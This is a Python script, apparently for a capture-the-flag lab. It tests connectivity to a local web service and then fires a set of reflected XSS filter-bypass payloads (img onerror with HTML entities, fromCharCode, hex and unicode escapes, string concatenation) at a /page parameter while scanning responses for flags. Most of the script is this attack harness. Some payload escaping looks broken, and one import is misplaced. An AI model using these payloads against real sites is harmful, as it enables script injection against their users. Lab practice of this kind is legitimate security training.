import requests
import socket
import sys

target = "http://127.0.0.1:33117"
timeout = 15  # Increased timeout for slow services

print("🔍 DIAGNOSTIC: Comprehensive connection analysis")
print(f"Target: {target}")
print("="*60)

# Method 1: Raw socket check first
try:
    print("\n1. Testing raw TCP connectivity...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    result = sock.connect_ex(('127.0.0.1', 33117))
    sock.close()
    if result == 0:
        print("   ✅ Port 33117 is OPEN and accepting connections")
    else:
        print(f"   ❌ Port 33117 is CLOSED (error code: {result})")
except Exception as e:
    print(f"   ❌ Socket test failed: {e}")

# Method 2: HTTP request with detailed error handling
try:
    print("\n2. Attempting HTTP GET request...")
    # First try to establish initial connection
    session = requests.Session()
    session.trust_env = False  # Skip proxy settings
    
    response = session.get(target, timeout=timeout)
    print(f"   ✅ Connection established!")
    print(f"   Status: {response.status_code}")
    print(f"   Server: {response.headers.get('server', 'Unknown')}")
    print(f"   Content-Type: {response.headers.get('content-type', 'Unknown')}")
    print(f"   Response size: {len(response.text)} bytes")
    
    # Show first 300 chars of response
    preview = response.text[:300].replace('\n', ' ')
    print(f"   Preview: {preview}...")
    
    # Try the /page endpoint
    print("\n3. Testing /page endpoint...")
    test_url = f"{target}/page?name=test"
    page_response = session.get(test_url, timeout=timeout)
    print(f"   Status: {page_response.status_code}")
    print(f"   Size: {len(page_response.text)} bytes")
    
    if 'FLAG' in page_response.text.upper():
        import re
        flags = re.findall(r'FLAG\{[^}]+\}', page_response.text, re.IGNORECASE)
        print(f"   🚩 FLAG(s) found: {flags}")
    
    # Proceed with XSS testing since connection works
    print("\n✓ Service confirmed active - proceeding with XSS filter bypass tests")
    
    # XSS payload tests will be executed here
    payloads = {
        "HTML entity": '\"><img src=x onerror=alert(\\'&#88;&#83;&#83;\\')>',
        "FromCharCode": '\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>',
        "Hex escape": '\"><img src=x onerror=alert(\\'\\\\x58\\\\x53\\\\x53\\')>',
        "Unicode escape": '\"><img src=x onerror=alert(\\'\\\\\\\\u0058\\\\\\\\u0053\\\\\\\\u0053\\')>',
        "String concat": '\"><img src=x onerror=alert(\\'X\\'+\\'SS\\')>',
    }
    
    print("\n" + "="*60)
    print("XSS FILTER BYPASS TEST RESULTS")
    print("="*60)
    
    success_count = 0
    for idx, (name, payload) in enumerate(payloads.items(), 1):
        print(f"\n[{idx}/{len(payloads)}] {name}")
        encoded = requests.utils.quote(payload, safe='')
        url = f"{target}/page?name={encoded}"
        
        try:
            resp = session.get(url, timeout=10)
            content = resp.text
            
            # Check reflection
            if payload.rstrip('>') in content:
                print(f"   ✅ FULLY REFLECTED")
                success_count += 1
            elif 'onerror=' in content and name == "HTML entity" and '&#88' in content:
                print(f"   ✅ BYPASSED - HTML entities working")
                success_count += 1
            elif 'String.fromCharCode' in content and 'onerror=' in content:
                print(f"   ✅ BYPASSED - FromCharCode working")
                success_count += 1
            else:
                print(f"   ❌ BLOCKED")
            
            if 'FLAG' in content.upper():
                flags = re.findall(r'FLAG\{[^}]+\}', content, re.IGNORECASE)
                print(f"   🚩 FLAG: {flags}")
            
        except Exception as e:
            print(f"   ❌ Error: {e}")
    
    print(f"\n{'='*60}")
    print(f"✨ Successful bypasses: {success_count}/{len(payloads)}")
    
except requests.exceptions.ConnectionError as e:
    print(f"   ❌ ConnectionError: {e}")
    print("   💡 The service is not running or refusing connections")
    print("   💡 Check: Is the service started? Is port 33117 correct?")
except requests.exceptions.Timeout:
    print(f"   ❌ Timeout: Service didn't respond within {timeout}s")
    print("   💡 The service might be overloaded or very slow")
except requests.exceptions.RequestException as e:
    print(f"   ❌ Request error: {type(e).__name__}")
    print(f"   Details: {str(e)}")
except Exception as e:
    print(f"   ❌ Unexpected error: {type(e).__name__}")
    print(f"   Details: {str(e)}")
    import traceback
    traceback.print_exc()

print("\n" + "="*60)
print("Diagnostic complete")

